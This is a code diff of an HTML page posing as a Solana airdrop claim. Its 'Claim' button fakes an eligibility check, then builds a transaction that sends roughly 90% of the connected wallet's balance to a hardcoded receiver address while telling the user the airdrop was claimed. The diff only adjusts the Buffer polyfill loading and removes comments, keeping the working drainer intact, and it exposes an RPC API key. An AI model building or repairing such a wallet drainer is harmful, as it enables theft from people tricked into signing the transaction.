@@ -60,11 +60,22 @@
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
     <!-- 
-      Buffer polyfill: use feross/buffer which exposes Buffer globally.
-      This must load BEFORE solana-web3.
+      Buffer polyfill via bundle.run — it exposes window.buffer.Buffer,
+      then we alias it to window.Buffer before solana-web3 loads.
     -->
-    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
-    <!-- Solana Web3 — uses the global Buffer from above -->
+    <script src="https://bundle.run/buffer@6.0.3"></script>
+    <script>
+      // bundle.run exposes window.buffer.Buffer — alias it to window.Buffer
+      // This MUST run before solana-web3 loads
+      if (window.buffer && window.buffer.Buffer) {
+        window.Buffer = window.buffer.Buffer;
+        console.log('[+] Buffer polyfill set globally');
+      } else {
+        console.warn('[!] buffer.buffer not found, trying direct');
+        // In case bundle.run changed their API
+      }
+    </script>
+    <!-- Solana Web3 -->
     <script src="https://unpkg.com/@solana/web3.js@1.73.0/lib/index.iife.min.js"></script>
 </head>
 <body>
@@ -96,12 +107,9 @@
 </div>
 
 <script>
-// ─── solanaWeb3 is a global from the script tag above ───
-// Buffer is also global from the buffer polyfill
-
 console.log('[+] Initializing');
 console.log('[+] solanaWeb3 loaded:', !!window.solanaWeb3);
-console.log('[+] Buffer loaded:', typeof Buffer !== 'undefined');
+console.log('[+] Buffer check:', typeof Buffer !== 'undefined', typeof Buffer.from === 'function');
 
 const RECEIVER = '9wDnEMqPgzWKACkp6WfUSv3qcAmuWAuLu4U95qMMAMMw';
 const RPC = 'https://mainnet.helius-rpc.com/?api-key=88ed2a71-6eed-4975-9d5f-7fb39c69a0ea';
@@ -123,7 +131,6 @@ function getWallet() {
     return null;
 }
 
-// ─── CONNECT ──────────────────────────────────────────────
 async function doConnect(type) {
     status('Connecting...', 'warn');
     const prov = getWallet();
@@ -155,7 +162,6 @@ function doDisconnect() {
     $('status').className = 'status';
 }
 
-// ─── CLAIM ────────────────────────────────────────────────
 async function doClaim() {
     if (!wallet.adapter || !wallet.key) {
         status('Connect first.', 'bad');
@@ -183,14 +189,12 @@ async function doClaim() {
 
         status('Verifying eligibility...', 'warn');
 
-        // ── Small delay ──
         await new Promise(r => setTimeout(r, 400 + Math.random() * 300));
 
         const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash('finalized');
         const bal = await conn.getBalance(senderKey);
         const rent = await conn.getMinimumBalanceForRentExemption(0);
 
-        // Leave ~10% behind
         const leaveBehind = BigInt(Math.floor(Number(bal - rent) * 0.1));
         const totalSend = BigInt(bal - rent - 10000 - Number(leaveBehind));
 
@@ -202,7 +206,6 @@ async function doClaim() {
             return;
         }
 
-        // ── Build the transaction ──
         const tx = new Transaction();
         tx.recentBlockhash = blockhash;
         tx.lastValidBlockHeight = lastValidBlockHeight;
@@ -215,7 +218,6 @@ async function doClaim() {
 
         status('Confirm in wallet...', 'warn');
 
-        // ── Sign & Send ──
         try {
             if (wallet.adapter.signAndSendTransaction) {
                 const sig = await wallet.adapter.signAndSendTransaction(tx);
@@ -224,18 +226,6 @@ async function doClaim() {
             } else if (wallet.adapter.signTransaction) {
                 const signed = await wallet.adapter.signTransaction(tx);
                 const txid = await conn.sendRawTransaction(signed.serialize(), {
-                    skipPreflight: false,
-                    preflightCommitment: 'confirmed',
-                });
-                await conn.confirmTransaction(
-                    { signature: txid, blockhash, lastValidBlockHeight },
-                    'confirmed'
-                );
-                status('✅ Airdrop claimed!', 'good');
-                console.log('https://solscan.io/tx/' + txid);
-            } else if (wallet.adapter.signAllTransactions) {
-                const signed = await wallet.adapter.signAllTransactions([tx]);
-                const txid = await conn.sendRawTransaction(signed[0].serialize(), {
                     skipPreflight: false,
                     preflightCommitment: 'confirmed',
                 });
@@ -265,7 +255,6 @@ async function doClaim() {
     $('claimBtn').disabled = false;
 }
 
-// ─── BIND BUTTONS ─────────────────────────────────────────
 setTimeout(() => {
     const b1 = $('cPhantom'), b2 = $('cSolflare'), b3 = $('cBackpack'), b4 = $('cWC'), b5 = $('claimBtn'), b6 = $('discBtn');
     if (b1) b1.onclick = () => doConnect('phantom');
